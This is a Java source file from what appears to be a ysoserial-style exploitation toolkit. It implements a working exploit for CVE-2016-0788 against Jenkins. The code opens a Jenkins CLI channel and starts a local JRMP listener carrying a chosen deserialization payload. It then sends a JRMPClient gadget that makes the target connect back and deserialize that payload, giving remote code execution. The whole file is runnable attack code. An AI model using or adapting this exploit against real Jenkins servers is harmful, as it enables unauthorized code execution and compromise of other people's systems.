package com.h2tg.ysogate.server;


import hudson.remoting.Channel;
import com.h2tg.ysogate.Main;
import com.h2tg.ysogate.payloads.gadgets.JRMPClient;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.rmi.registry.Registry;
import java.util.Random;


/**
 * CVE-2016-0788 exploit (2)
 * <p>
 * - Sets up a local {@link JRMPListener}
 * - Delivers a {@link JRMPClient} payload via the CLI protocol
 * that will cause the remote to open a JRMP connection to our listener
 * - upon connection the specified payload will be delivered to the remote
 * (that will deserialize using a default ObjectInputStream)
 *
 * @author mbechler
 */
public class JenkinsReverse {

	public static final void main(final String[] args) {
		if (args.length < 4) {
			System.err.println(JenkinsListener.class.getName() + " <jenkins_url> <local_addr> <args...>");
			System.exit(-1);
		}

		// 去除前两个参数
		String[] newArray = new String[args.length - 2];
		System.arraycopy(args, 2, newArray, 0, newArray.length);

		Main.main(newArray);
		final Object payloadObject = Main.PAYLOAD;
		String       myAddr        = args[1];
		int          jrmpPort      = new Random().nextInt(65536 - 1024) + 1024;
		String       jenkinsUrl    = args[0];

		Thread  t = null;
		Channel c = null;
		try {
			InetSocketAddress isa = JenkinsCLI.getCliPort(jenkinsUrl);
			c = JenkinsCLI.openChannel(isa);
			JRMPListener listener = new JRMPListener(jrmpPort, payloadObject);
			t = new Thread(listener, "ReverseDGC");
			t.setDaemon(true);
			t.start();
			Registry payload = new JRMPClient().getObject(myAddr + ":" + jrmpPort);
			c.call(JenkinsCLI.getPropertyCallable(payload));
			listener.waitFor(1000);
			listener.close();
		} catch (Throwable e) {
			e.printStackTrace();
		} finally {
			if (c != null) {
				try {
					c.close();
				} catch (IOException e) {
					e.printStackTrace(System.err);
				}
			}

			if (t != null) {
				t.interrupt();
				try {
					t.join();
				} catch (InterruptedException e) {
					e.printStackTrace(System.err);
				}
			}
		}
	}
}
